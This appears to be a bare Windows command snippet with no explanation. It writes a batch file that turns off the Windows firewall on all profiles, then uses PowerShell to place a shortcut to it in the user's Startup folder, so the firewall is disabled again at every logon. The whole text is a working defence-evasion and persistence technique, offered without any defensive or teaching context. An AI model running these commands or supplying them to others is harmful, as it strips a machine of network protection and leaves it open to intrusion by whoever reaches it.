echo "NetSh Advfirewall set allprofiles state off" >> disableFW.bat

powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\disableFW.lnk');$s.TargetPath='disableFW.bat';$s.Save()"

